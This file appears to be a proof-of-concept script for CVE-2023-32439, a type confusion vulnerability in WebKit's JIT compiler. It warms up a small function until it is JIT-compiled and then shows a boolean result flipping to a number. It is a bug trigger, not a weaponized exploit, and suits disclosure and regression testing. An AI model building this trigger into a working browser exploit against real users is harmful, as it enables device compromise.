// PoC for CVE-2023-32439: Type Confusion in WebKit DFG JIT
const arr = [0];

function jitter() {
    // This function creates both EnumeratorNextUpdateIndexAndMode and HasIndexedProperty nodes
    for (let _ in arr) {          // Generates EnumeratorNextUpdateIndexAndMode
        return 0 in arr;          // Generates HasIndexedProperty
    }
}

function trigger() {
    // Execute jitter multiple times to trigger DFG and FTL compilation
    let a = jitter();             // a == true (correct result)
    
    // Heat up the function to trigger JIT compilation
    for (let i = 0; i < 0x100000; i++) {
        jitter();
    }
    
    let b = jitter();             // b == 0 (incorrect due to type confusion)
    
    // The type confusion manifests here: a is boolean, b is number
    if (a !== b) {
        // This branch will be taken when the vulnerability is triggered
        print("Type confusion successful: a=" + a + " (type: " + typeof a + "), b=" + b + " (type: " + typeof b + ")");
    }
}

// Execute the trigger function
trigger();